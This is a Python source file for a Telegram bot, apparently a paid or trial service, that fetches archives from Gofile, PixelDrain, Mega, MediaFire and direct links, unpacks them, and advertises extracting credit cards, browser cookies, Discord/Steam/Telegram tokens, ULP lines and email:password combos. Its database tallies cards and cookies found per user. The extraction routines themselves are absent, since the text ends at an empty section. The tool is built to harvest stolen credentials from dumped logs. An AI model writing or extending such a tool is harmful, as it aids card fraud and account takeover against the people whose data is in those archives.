#!/usr/bin/env python3.11
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ADVANCED ARCHIVE EXTRACTION BOT v9.0 – MEGA.PY INTEGRATED                  ║
║  Fully working · Permanent token support · Improved error handling          ║
║  Platforms: Gofile | PixelDrain | Mega.nz | MediaFire | Direct HTTP         ║
║  Extract:   CC | Cookies | Tokens | ULP | Combos                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import logging
import os
import re
import sys
import sqlite3
import time
import json
import shutil
import zipfile
import tarfile
import hashlib
import traceback
import concurrent.futures
import random
import string
import secrets
from pathlib import Path
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Set, Optional, Tuple, Any, Callable
from urllib.parse import urlparse, unquote, parse_qs
from collections import defaultdict
from contextlib import contextmanager

import aiohttp
import psutil
import requests

from aiogram import Bot, Dispatcher, F, types, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup,
    InlineKeyboardButton, FSInputFile, BufferedInputFile
)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

# Optional imports with better handling
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    print("⚠️ BeautifulSoup not installed - MediaFire may have issues")

try:
    import rarfile
    HAS_RARFILE = True
except ImportError:
    HAS_RARFILE = False
    print("⚠️ rarfile not installed - RAR extraction disabled")

try:
    import py7zr
    HAS_PY7ZR = True
except ImportError:
    HAS_PY7ZR = False
    print("⚠️ py7zr not installed - 7Z extraction disabled")

# Mega.py - Critical for Mega.nz support
try:
    from mega import Mega
    HAS_MEGA = True
    print("✅ Mega.py loaded successfully")
except ImportError:
    HAS_MEGA = False
    print("❌ Mega.py not installed! Mega.nz downloads will fail.")
    print("   Install with: pip install mega.py")

try:
    from supabase import create_client
    HAS_SUPABASE = True
except ImportError:
    HAS_SUPABASE = False


# ══════════════════════════════════════════════════════════════════════════════
#                       CONFIGURATION – ENVIRONMENT VARIABLES
# ══════════════════════════════════════════════════════════════════════════════

API_TOKEN = os.environ.get('BOT_TOKEN')
if not API_TOKEN:
    raise ValueError("❌ BOT_TOKEN environment variable not set!")

OWNER_ID = int(os.environ.get('OWNER_ID', '0'))
if OWNER_ID == 0:
    raise ValueError("❌ OWNER_ID environment variable not set!")

SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
SUPABASE_KEY = os.environ.get('SUPABASE_ANON_KEY', '')
GOFILE_API_TOKEN = os.environ.get('GOFILE_TOKEN', '')  # optional permanent token

# Limits
CHUNK_SIZE = 1024 * 1024  # 1 MB
MAX_WORKERS = 20
PROGRESS_UPDATE_INTERVAL = 1.5
TELEGRAM_FILE_LIMIT = 50 * 1024 * 1024  # 50 MB
TRIAL_TASKS = 3

# Paths
BASE_DIR = Path(__file__).parent
DOWNLOADS_DIR = BASE_DIR / "downloads"
EXTRACTS_DIR = BASE_DIR / "extracts"
RESULTS_DIR = BASE_DIR / "results"
TEMP_DIR = BASE_DIR / "temp"
DB_PATH = BASE_DIR / "bot_data.db"

for d in [DOWNLOADS_DIR, EXTRACTS_DIR, RESULTS_DIR, TEMP_DIR]:
    d.mkdir(parents=True, exist_ok=True)


# ══════════════════════════════════════════════════════════════════════════════
#                       LOGGING
# ══════════════════════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(name)s | %(levelname)s | %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("UltimateBot")


# ══════════════════════════════════════════════════════════════════════════════
#                       BOT INIT
# ══════════════════════════════════════════════════════════════════════════════

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)


# ══════════════════════════════════════════════════════════════════════════════
#                       EMOJI DEFINITIONS (Shortened for brevity)
# ══════════════════════════════════════════════════════════════════════════════

STAR = '<tg-emoji emoji-id="5368324170671202286">⭐</tg-emoji>'
CROWN = '<tg-emoji emoji-id="5361541227068722553">👑</tg-emoji>'
DIAMOND = '<tg-emoji emoji-id="5471952986970267163">💎</tg-emoji>'
FIRE = '<tg-emoji emoji-id="5199885118214255386">🔥</tg-emoji>'
ROCKET = '<tg-emoji emoji-id="5359385904535774578">🚀</tg-emoji>'
SPARKLES = '<tg-emoji emoji-id="5373026167722876724">✨</tg-emoji>'
TICK = '<tg-emoji emoji-id="5368324170671202286">✅</tg-emoji>'
CROSS = '<tg-emoji emoji-id="5447644880824181073">❌</tg-emoji>'
LOCK = '<tg-emoji emoji-id="5471952986970267163">🔐</tg-emoji>'
KEY = '<tg-emoji emoji-id="5471952986970267163">🔑</tg-emoji>'
COOKIE = '<tg-emoji emoji-id="5373026167722876724">🍪</tg-emoji>'
CARD = '<tg-emoji emoji-id="5471952986970267163">💳</tg-emoji>'
PACKAGE = '<tg-emoji emoji-id="5471952986970267163">📦</tg-emoji>'
DOWNLOAD = '<tg-emoji emoji-id="5471952986970267163">📥</tg-emoji>'
GEAR = '<tg-emoji emoji-id="5471952986970267163">⚙️</tg-emoji>'
CHART = '<tg-emoji emoji-id="5471952986970267163">📊</tg-emoji>'
CLOCK = '<tg-emoji emoji-id="5471952986970267163">⏳</tg-emoji>'
LIGHTNING = '<tg-emoji emoji-id="5471952986970267163">⚡</tg-emoji>'
SHIELD = '<tg-emoji emoji-id="5471952986970267163">🛡️</tg-emoji>'
GLOBE = '<tg-emoji emoji-id="5471952986970267163">🌐</tg-emoji>'
DISCORD = '<tg-emoji emoji-id="5471952986970267163">💬</tg-emoji>'
STEAM = '<tg-emoji emoji-id="5471952986970267163">🎮</tg-emoji>'
TELEGRAM = '<tg-emoji emoji-id="5471952986970267163">✈️</tg-emoji>'
COMBO = '<tg-emoji emoji-id="5471952986970267163">📋</tg-emoji>'
REPORT = '<tg-emoji emoji-id="5471952986970267163">📮</tg-emoji>'
ID_CARD = '<tg-emoji emoji-id="5471952986970267163">🆔</tg-emoji>'
GIFT = '<tg-emoji emoji-id="5471952986970267163">🎁</tg-emoji>'
WARN = '<tg-emoji emoji-id="5471952986970267163">⚠️</tg-emoji>'
INFO = '<tg-emoji emoji-id="5471952986970267163">ℹ️</tg-emoji>'
LINK = '<tg-emoji emoji-id="5471952986970267163">🔗</tg-emoji>'
TARGET = '<tg-emoji emoji-id="5471952986970267163">🎯</tg-emoji>'
FOLDER = '<tg-emoji emoji-id="5471952986970267163">📁</tg-emoji>'
PERSON = '<tg-emoji emoji-id="5471952986970267163">👤</tg-emoji>'
PHONE = '<tg-emoji emoji-id="5471952986970267163">📱</tg-emoji>'
CALENDAR = '<tg-emoji emoji-id="5471952986970267163">📅</tg-emoji>'
TROPHY = '<tg-emoji emoji-id="5471952986970267163">🏆</tg-emoji>'
WAVE = '<tg-emoji emoji-id="5471952986970267163">👋</tg-emoji>'
CANCEL = '<tg-emoji emoji-id="5447644880824181073">🚫</tg-emoji>'


# ══════════════════════════════════════════════════════════════════════════════
#                       DESIGN CLASS
# ══════════════════════════════════════════════════════════════════════════════

def _box(title: str, emoji: str = "") -> str:
    pad = "─" * 30
    return f"╭{pad}╮\n│  {emoji}  <b>{title}</b>\n╰{pad}╯\n"

class Design:
    SUCCESS = TICK
    ERROR = CROSS
    PREMIUM = CROWN
    INFO = INFO

    @staticmethod
    def welcome(user_name: str, user_id: int, trial_tasks: int) -> str:
        return (
            f"{_box('ULTIMATE BOT v9.0', ROCKET)}\n"
            f"{WAVE} Hello, <b>{user_name}</b>! Welcome aboard.\n\n"
            f"{ID_CARD} Your ID: <code>{user_id}</code>\n"
            f"{GIFT} Free Trial: <b>{trial_tasks} tasks</b>\n\n"
            f"{FIRE} <b>WHAT I CAN DO</b>\n"
            f"{DOWNLOAD} Download from Gofile, Mega, PixelDrain, MediaFire\n"
            f"{CARD} Extract Credit Cards\n"
            f"{COOKIE} Extract Cookies (per-domain)\n"
            f"{DIAMOND} Extract Tokens (Discord, Steam, Telegram)\n"
            f"{KEY} Extract ULP combos\n"
            f"{COMBO} Extract Email:Pass combos\n\n"
            f"{SPARKLES} <b>COMMANDS</b>\n"
            f"/help — Full guide\n"
            f"/tasks — Your task balance\n"
            f"/redeem — Activate premium\n"
            f"/mypremium — Premium status\n"
            f"/cancel — Cancel current operation\n\n"
            f"{ROCKET} <b>Just send a link to get started!</b>"
        )

    @staticmethod
    def help() -> str:
        return (
            f"{_box('HELP GUIDE', INFO)}\n"
            f"{ROCKET} <b>HOW TO USE</b>\n"
            f"1. Send a supported link\n"
            f"2. Enter archive password if needed\n"
            f"3. Select what to extract\n"
            f"4. Receive results as files!\n\n"
            f"{LINK} <b>SUPPORTED LINKS</b>\n"
            f"• Gofile.io — <code>https://gofile.io/d/abc123</code>\n"
            f"• PixelDrain — <code>https://pixeldrain.com/u/abc123</code>\n"
            f"• Mega.nz — <code>https://mega.nz/file/abc123#key</code>\n"
            f"• MediaFire — <code>https://www.mediafire.com/file/...</code>\n"
            f"• Direct links — Any direct download URL\n\n"
            f"{CROWN} <b>PREMIUM</b>\n"
            f"/redeem <code>CODE</code> — Activate premium\n"
            f"/mypremium — Check premium status\n\n"
            f"{SHIELD} Use /cancel to abort at any time"
        )

    @staticmethod
    def processing(platform: str, tasks: List[str]) -> str:
        return (
            f"{_box('PROCESSING', GEAR)}\n"
            f"{LINK} Platform: <b>{platform.upper()}</b>\n"
            f"{TARGET} Tasks: <b>{', '.join(tasks) if tasks else 'None'}</b>\n\n"
            f"{CLOCK} Initializing download..."
        )

    @staticmethod
    def download_progress(filename: str, bar: str, percent: float,
                          speed: str, downloaded: str, total: str) -> str:
        return (
            f"{_box('DOWNLOADING', DOWNLOAD)}\n"
            f"{FOLDER} <code>{filename}</code>\n\n"
            f"<b>[{bar}]</b>  {percent:.1f}%\n\n"
            f"{PACKAGE} {downloaded} / {total}\n"
            f"{LIGHTNING} {speed}\n\n"
            f"{CLOCK} Please wait..."
        )

    @staticmethod
    def extracting(file_count: int) -> str:
        return (
            f"{_box('EXTRACTING', PACKAGE)}\n"
            f"{TICK} Downloaded <b>{file_count}</b> file(s)\n"
            f"{CLOCK} Extracting archives..."
        )

    @staticmethod
    def results(result_files: List[Tuple[str, Any, int]],
                results_data: Dict[str, Any]) -> str:
        lines = [f"{_box('COMPLETED', TROPHY)}\n{CHART} <b>RESULTS</b>\n"]
        for name, _, count in result_files:
            lines.append(f"  {name}: <b>{count}</b> items")
        return "\n".join(lines)

    @staticmethod
    def error(message: str, is_download_error: bool = False) -> str:
        title = "DOWNLOAD FAILED" if is_download_error else "ERROR"
        return f"{_box(title, CROSS)}\n{message}\n\nPlease try again."

    @staticmethod
    def banned(reason: str = "") -> str:
        return (
            f"{_box('BANNED', CANCEL)}\n"
            f"You have been banned.\n"
            + (f"{WARN} Reason: {reason}\n" if reason else "")
            + f"\nContact @Band1tos9 to appeal."
        )

    @staticmethod
    def cancelled() -> str:
        return f"{CANCEL} <b>Operation cancelled.</b>"


# ══════════════════════════════════════════════════════════════════════════════
#                       FSM STATES
# ══════════════════════════════════════════════════════════════════════════════

class BotStates(StatesGroup):
    waiting_for_password = State()
    waiting_for_gofile_password = State()
    waiting_for_custom_domains = State()
    waiting_for_admin_input = State()


# ══════════════════════════════════════════════════════════════════════════════
#                       UTILITY FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════════

def format_size(size_bytes: int) -> str:
    if size_bytes <= 0:
        return "0 B"
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.2f} {unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.2f} PB"

def format_speed(speed: float) -> str:
    return f"{format_size(speed)}/s"

def make_progress_bar(percent: float, length: int = 12) -> str:
    filled = int(length * percent / 100)
    return "█" * filled + "░" * (length - filled)

def generate_session_id() -> str:
    return secrets.token_hex(8)

def sanitize_filename(name: str) -> str:
    name = re.sub(r'[<>:"/\\|?*]', '_', name)
    name = re.sub(r'[\x00-\x1f\x7f]', '', name)
    name = re.sub(r'^[\.\s]+', '', name)
    name = re.sub(r'[\.\s]+$', '', name)
    return name[:200] or 'unnamed'

def detect_platform(url: str) -> str:
    url_lower = url.lower()
    if 'gofile.io' in url_lower:
        return 'gofile'
    elif 'pixeldrain.com' in url_lower:
        return 'pixeldrain'
    elif 'mega.nz' in url_lower or 'mega.co.nz' in url_lower:
        return 'mega'
    elif 'mediafire.com' in url_lower:
        return 'mediafire'
    else:
        return 'direct'


# ══════════════════════════════════════════════════════════════════════════════
#                       DATABASE (SQLite)
# ══════════════════════════════════════════════════════════════════════════════

class Database:
    def __init__(self):
        self._init_db()

    @contextmanager
    def get_connection(self):
        conn = sqlite3.connect(str(DB_PATH))
        conn.row_factory = sqlite3.Row
        try:
            yield conn
            conn.commit()
        finally:
            conn.close()

    def _init_db(self):
        with self.get_connection() as conn:
            conn.executescript('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    total_downloads INTEGER DEFAULT 0,
                    total_cc_found INTEGER DEFAULT 0,
                    total_cookies_found INTEGER DEFAULT 0,
                    total_ulp_found INTEGER DEFAULT 0,
                    total_combos_found INTEGER DEFAULT 0,
                    is_banned INTEGER DEFAULT 0,
                    ban_reason TEXT
                );

                CREATE TABLE IF NOT EXISTS sessions (
                    session_id TEXT PRIMARY KEY,
                    user_id INTEGER,
                    url TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );

                CREATE TABLE IF NOT EXISTS activity_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            ''')

    def register_user(self, user_id: int, username: str = "", first_name: str = ""):
        with self.get_connection() as conn:
            conn.execute('''
                INSERT OR REPLACE INTO users (user_id, username, first_name, last_seen)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (user_id, username or "", first_name or ""))

    def check_banned(self, user_id: int) -> Tuple[bool, str]:
        with self.get_connection() as conn:
            row = conn.execute('SELECT is_banned, ban_reason FROM users WHERE user_id=?', (user_id,)).fetchone()
            if row and row['is_banned']:
                return True, row['ban_reason'] or ""
        return False, ""

    def ban_user(self, user_id: int, reason: str = "") -> bool:
        with self.get_connection() as conn:
            conn.execute('UPDATE users SET is_banned=1, ban_reason=? WHERE user_id=?', (reason, user_id))
            return conn.total_changes > 0

    def unban_user(self, user_id: int) -> bool:
        with self.get_connection() as conn:
            conn.execute('UPDATE users SET is_banned=0, ban_reason=NULL WHERE user_id=?', (user_id,))
            return conn.total_changes > 0

    def log_activity(self, user_id: int, action: str):
        with self.get_connection() as conn:
            conn.execute('INSERT INTO activity_log (user_id, action) VALUES (?, ?)', (user_id, action))

    def increment_stats(self, user_id: int, **kwargs):
        with self.get_connection() as conn:
            for key, value in kwargs.items():
                if value:
                    conn.execute(f'UPDATE users SET {key}=COALESCE({key},0)+? WHERE user_id=?', (value, user_id))

    def create_session(self, session_id: str, user_id: int, url: str):
        with self.get_connection() as conn:
            conn.execute('INSERT INTO sessions (session_id, user_id, url) VALUES (?, ?, ?)',
                        (session_id, user_id, url))

db = Database()


# ══════════════════════════════════════════════════════════════════════════════
#                       GOFILE DOWNLOADER – FIXED
# ══════════════════════════════════════════════════════════════════════════════

class GofileDownloader:
    def __init__(self, download_dir: Path, progress_callback=None):
        self.download_dir = download_dir
        self.progress_callback = progress_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://gofile.io',
            'Referer': 'https://gofile.io/'
        })
        self.token = self._get_token()

    def _get_token(self) -> str:
        """Get Gofile API token – supports permanent token from env or guest token."""
        # If permanent token is provided, use it
        if GOFILE_API_TOKEN:
            self.session.headers.update({
                'Authorization': f'Bearer {GOFILE_API_TOKEN}',
                'Cookie': f'accountToken={GOFILE_API_TOKEN}'
            })
            logger.info("✅ Using permanent Gofile token")
            return GOFILE_API_TOKEN

        # Otherwise, create a guest token using the latest API
        try:
            # New guest token endpoint
            resp = self.session.get('https://api.gofile.io/getToken', timeout=10)
            data = resp.json()
            if data.get('status') == 'ok':
                token = data['data']['token']
                self.session.headers.update({
                    'Authorization': f'Bearer {token}',
                    'Cookie': f'accountToken={token}'
                })
                logger.info("✅ Gofile guest token obtained")
                return token
            else:
                # Fallback to old method
                resp = self.session.post('https://api.gofile.io/createAccount', timeout=10)
                data = resp.json()
                if data.get('status') == 'ok':
                    token = data['data']['token']
                    self.session.headers.update({
                        'Authorization': f'Bearer {token}',
                        'Cookie': f'accountToken={token}'
                    })
                    logger.info("✅ Gofile token obtained (old method)")
                    return token
        except Exception as e:
            logger.error(f"Gofile token error: {e}")
        return ""

    def get_content(self, content_id: str, password: str = None) -> Dict:
        url = f"https://api.gofile.io/contents/{content_id}"
        params = {'wt': '4fd6sg89d7s6', 'cache': 'true'}
        try:
            if password:
                resp = self.session.post(url, params=params, json={'password': password}, timeout=30)
            else:
                resp = self.session.get(url, params=params, timeout=30)
            data = resp.json()
            if data.get('status') != 'ok':
                raise ValueError(f"API error: {data.get('status')}")
            return data['data']
        except Exception as e:
            raise ValueError(f"Gofile API error: {e}")

    def collect_files(self, data: Dict, base_path: Path, files: List[Dict]):
        if data['type'] == 'file':
            files.append({
                'name': data['name'],
                'link': data['link'],
                'size': data.get('size', 0),
                'path': base_path
            })
        elif data['type'] == 'folder':
            folder_path = base_path / sanitize_filename(data['name'])
            folder_path.mkdir(exist_ok=True)
            for child in data.get('children', {}).values():
                self.collect_files(child, folder_path, files)

    def download_file(self, file_info: Dict) -> Tuple[bool, Path]:
        file_path = file_info['path'] / sanitize_filename(file_info['name'])
        url = file_info['link']
        if file_path.exists():
            return True, file_path
        temp_path = file_path.with_suffix('.part')
        try:
            headers = {'Authorization': f'Bearer {self.token}'} if self.token else {}
            response = self.session.get(url, headers=headers, stream=True, timeout=30)
            response.raise_for_status()
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=CHUNK_SIZE):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
            if temp_path.exists():
                shutil.move(str(temp_path), str(file_path))
                return True, file_path
        except Exception as e:
            logger.error(f"Download error: {e}")
        return False, file_path

    def download(self, url: str, password: str = None, session_id: str = None) -> Tuple[bool, List[Path], str]:
        try:
            match = re.search(r'gofile\.io/d/([a-zA-Z0-9]+)', url)
            if not match:
                return False, [], "Invalid Gofile URL"
            content_id = match.group(1)
            content = self.get_content(content_id, password)
            session_dir = self.download_dir / (session_id or generate_session_id())
            session_dir.mkdir(exist_ok=True)
            files = []
            self.collect_files(content, session_dir, files)
            if not files:
                return False, [], "No files found"
            downloaded = []
            for i, fi in enumerate(files, 1):
                if self.progress_callback:
                    asyncio.create_task(self.progress_callback(
                        f"File {i}/{len(files)}: {fi['name']}", 0, 0, 0, fi['size']
                    ))
                success, path = self.download_file(fi)
                if success:
                    downloaded.append(path)
            return len(downloaded) > 0, downloaded, ""
        except Exception as e:
            logger.error(f"Gofile error: {e}")
            return False, [], str(e)


# ══════════════════════════════════════════════════════════════════════════════
#                       PIXELDRAIN DOWNLOADER
# ══════════════════════════════════════════════════════════════════════════════

class PixelDrainDownloader:
    def __init__(self, download_dir: Path, progress_callback=None):
        self.download_dir = download_dir
        self.progress_callback = progress_callback
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.api_url = "https://pixeldrain.com/api"

    def get_file_info(self, file_id: str) -> Dict:
        try:
            resp = self.session.get(f"{self.api_url}/file/{file_id}/info", timeout=15)
            if resp.status_code == 200:
                return resp.json()
        except:
            pass
        return {'name': f'file_{file_id}', 'size': 0}

    def download_file(self, file_id: str, filename: str, dest_path: Path) -> Tuple[bool, Path]:
        file_path = dest_path / sanitize_filename(filename)
        if file_path.exists():
            return True, file_path
        temp_path = file_path.with_suffix('.part')
        try:
            url = f"{self.api_url}/file/{file_id}"
            response = self.session.get(url, stream=True, timeout=30)
            response.raise_for_status()
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=CHUNK_SIZE):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
            if temp_path.exists():
                shutil.move(str(temp_path), str(file_path))
                return True, file_path
        except Exception as e:
            logger.error(f"PixelDrain download error: {e}")
        return False, file_path

    def download(self, url: str, session_id: str = None) -> Tuple[bool, List[Path], str]:
        try:
            match = re.search(r'pixeldrain\.com/(?:u|api/file)/([a-zA-Z0-9_-]+)', url)
            if not match:
                return False, [], "Invalid PixelDrain URL"
            file_id = match.group(1)
            info = self.get_file_info(file_id)
            session_dir = self.download_dir / (session_id or generate_session_id())
            session_dir.mkdir(exist_ok=True)
            success, path = self.download_file(file_id, info.get('name', f'file_{file_id}'), session_dir)
            if success:
                return True, [path], ""
            return False, [], "Download failed"
        except Exception as e:
            logger.error(f"PixelDrain error: {e}")
            return False, [], str(e)


# ══════════════════════════════════════════════════════════════════════════════
#                       MEGA.NZ DOWNLOADER – FULLY INTEGRATED
# ══════════════════════════════════════════════════════════════════════════════

class MegaDownloader:
    def __init__(self, download_dir: Path, progress_callback=None):
        self.download_dir = download_dir
        self.progress_callback = progress_callback
        self.mega = None
        self._init_mega()

    def _init_mega(self):
        """Initialize Mega.py with proper error handling"""
        if HAS_MEGA:
            try:
                self.mega = Mega()
                logger.info("✅ Mega.py initialized successfully")
            except Exception as e:
                logger.error(f"❌ Mega.py initialization failed: {e}")
                self.mega = None
        else:
            logger.error("❌ Mega.py not installed")

    def download(self, url: str, session_id: str = None) -> Tuple[bool, List[Path], str]:
        """Download from Mega.nz with improved error handling"""
        if not HAS_MEGA or not self.mega:
            return False, [], "Mega.py not installed. Install with: pip install mega.py"

        try:
            # Create session directory
            session_dir = self.download_dir / (session_id or generate_session_id())
            session_dir.mkdir(parents=True, exist_ok=True)

            # Login anonymously
            mega_instance = self.mega.login()
            
            # Download the file/folder
            mega_instance.download_url(url, str(session_dir))

            # Find downloaded files
            downloaded = []
            for path in session_dir.rglob('*'):
                if path.is_file():
                    downloaded.append(path)

            if downloaded:
                logger.info(f"✅ Mega download successful: {len(downloaded)} files")
                return True, downloaded, ""
            else:
                return False, [], "No files downloaded from Mega"

        except Exception as e:
            error_msg = str(e)
            logger.error(f"Mega download error: {error_msg}")
            
            # Provide user-friendly error messages
            if 'Invalid url' in error_msg or 'URL' in error_msg:
                return False, [], "Invalid Mega.nz URL format"
            elif 'not found' in error_msg.lower():
                return False, [], "Mega.nz file/folder not found"
            elif 'key' in error_msg.lower():
                return False, [], "Invalid or missing decryption key"
            else:
                return False, [], f"Mega download failed: {error_msg[:100]}"


# ══════════════════════════════════════════════════════════════════════════════
#                       MEDIAFIRE DOWNLOADER
# ══════════════════════════════════════════════════════════════════════════════

class MediaFireDownloader:
    def __init__(self, download_dir: Path, progress_callback=None):
        self.download_dir = download_dir
        self.progress_callback = progress_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
        })

    def get_direct_link(self, url: str) -> Tuple[str, str]:
        try:
            resp = self.session.get(url, timeout=20)
            resp.raise_for_status()
            html = resp.text
            patterns = [
                r'href="(https?://download[0-9]+\.mediafire\.com/[^"]+)"',
                r'<a[^>]+href="([^"]+)"[^>]+class="[^"]*input[^"]*popsok[^"]*"',
                r'<a[^>]+id="downloadButton"[^>]+href="([^"]+)"',
            ]
            for pattern in patterns:
                match = re.search(pattern, html)
                if match:
                    direct_url = match.group(1)
                    if not direct_url.startswith('http'):
                        direct_url = 'https:' + direct_url if direct_url.startswith('//') else url + direct_url
                    fname_match = re.search(r'/([^/]+\.(?:zip|rar|7z|tar|gz))', direct_url)
                    filename = fname_match.group(1) if fname_match else 'mediafire_file'
                    return direct_url, filename
            raise ValueError("Could not find download link")
        except Exception as e:
            raise ValueError(f"Failed to get download link: {e}")

    def download_file(self, url: str, filename: str, dest_path: Path) -> Tuple[bool, Path]:
        file_path = dest_path / sanitize_filename(filename)
        if file_path.exists():
            return True, file_path
        temp_path = file_path.with_suffix('.part')
        try:
            response = self.session.get(url, stream=True, timeout=30)
            response.raise_for_status()
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=CHUNK_SIZE):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
            if temp_path.exists():
                shutil.move(str(temp_path), str(file_path))
                return True, file_path
        except Exception as e:
            logger.error(f"MediaFire download error: {e}")
        return False, file_path

    def download(self, url: str, session_id: str = None) -> Tuple[bool, List[Path], str]:
        try:
            direct_url, filename = self.get_direct_link(url)
            session_dir = self.download_dir / (session_id or generate_session_id())
            session_dir.mkdir(exist_ok=True)
            success, path = self.download_file(direct_url, filename, session_dir)
            if success:
                return True, [path], ""
            return False, [], "Download failed"
        except Exception as e:
            logger.error(f"MediaFire error: {e}")
            return False, [], str(e)


# ══════════════════════════════════════════════════════════════════════════════
#                       DIRECT DOWNLOADER
# ══════════════════════════════════════════════════════════════════════════════

class DirectDownloader:
    def __init__(self, download_dir: Path, progress_callback=None):
        self.download_dir = download_dir
        self.progress_callback = progress_callback

    def get_filename(self, url: str, response: requests.Response) -> str:
        cd = response.headers.get('content-disposition', '')
        if 'filename=' in cd:
            match = re.search(r'filename[*]?=(?:UTF-8\'\')?["\']?([^"\';\n]+)', cd)
            if match:
                return unquote(match.group(1))
        parsed = urlparse(url)
        path_name = unquote(parsed.path.split('/')[-1])
        if path_name and '.' in path_name:
            return path_name
        return 'download'

    def download(self, url: str, session_id: str = None) -> Tuple[bool, List[Path], str]:
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0'})
            head_resp = session.head(url, allow_redirects=True, timeout=10)
            filename = self.get_filename(url, head_resp)
            session_dir = self.download_dir / (session_id or generate_session_id())
            session_dir.mkdir(exist_ok=True)
            file_path = session_dir / sanitize_filename(filename)
            if file_path.exists():
                return True, [file_path], ""
            temp_path = file_path.with_suffix('.part')
            response = session.get(url, stream=True, timeout=30)
            response.raise_for_status()
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=CHUNK_SIZE):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
            if temp_path.exists():
                shutil.move(str(temp_path), str(file_path))
                return True, [file_path], ""
            return False, [], "Download failed"
        except Exception as e:
            logger.error(f"Direct download error: {e}")
            return False, [], str(e)


# ══════════════════════════════════════════════════════════════════════════════
#                       DOWNLOAD MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class DownloadManager:
    def __init__(self):
        self.download_dir = DOWNLOADS_DIR

    async def download(self, url: str, platform: str, session_id: str = None,
                      password: str = None, progress_callback=None) -> Tuple[bool, List[Path], str]:
        loop = asyncio.get_event_loop()
        if platform == 'gofile':
            d = GofileDownloader(self.download_dir, progress_callback)
            return await loop.run_in_executor(None, lambda: d.download(url, password, session_id))
        elif platform == 'pixeldrain':
            d = PixelDrainDownloader(self.download_dir, progress_callback)
            return await loop.run_in_executor(None, lambda: d.download(url, session_id))
        elif platform == 'mega':
            d = MegaDownloader(self.download_dir, progress_callback)
            return await loop.run_in_executor(None, lambda: d.download(url, session_id))
        elif platform == 'mediafire':
            d = MediaFireDownloader(self.download_dir, progress_callback)
            return await loop.run_in_executor(None, lambda: d.download(url, session_id))
        else:
            d = DirectDownloader(self.download_dir, progress_callback)
            return await loop.run_in_executor(None, lambda: d.download(url, session_id))


# ══════════════════════════════════════════════════════════════════════════════
#                       ARCHIVE EXTRACTOR
# ══════════════════════════════════════════════════════════════════════════════

class ArchiveExtractor:
    @staticmethod
    def is_archive(file_path: Path) -> bool:
        ext = file_path.suffix.lower()
        return ext in ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2']

    @staticmethod
    def extract(file_path: Path, dest_dir: Path, password: str = None) -> Tuple[bool, str, List[Path]]:
        try:
            dest_dir.mkdir(parents=True, exist_ok=True)
            ext = file_path.suffix.lower()
            if ext == '.zip':
                with zipfile.ZipFile(file_path, 'r') as zf:
                    if password:
                        zf.setpassword(password.encode())
                    zf.extractall(dest_dir)
            elif ext == '.rar' and HAS_RARFILE:
                with rarfile.RarFile(file_path) as rf:
                    if password:
                        rf.setpassword(password)
                    rf.extractall(dest_dir)
            elif ext == '.7z' and HAS_PY7ZR:
                with py7zr.SevenZipFile(file_path, 'r', password=password) as sz:
                    sz.extractall(dest_dir)
            elif ext in ['.tar', '.gz', '.bz2']:
                import tarfile
                with tarfile.open(file_path, 'r:*') as tf:
                    tf.extractall(dest_dir)
            else:
                return False, f"Unsupported format: {ext}", []
            extracted = [Path(root)/f for root,_,files in os.walk(dest_dir) for f in files]
            return True, "OK", extracted
        except Exception as e:
            return False, str(e), []


# ══════════════════════════════════════════════════════════════════════════════
#                       DATA EXTRACTORS (Simplified)
# ══════════════════════════════════════════════════════════════════════════════

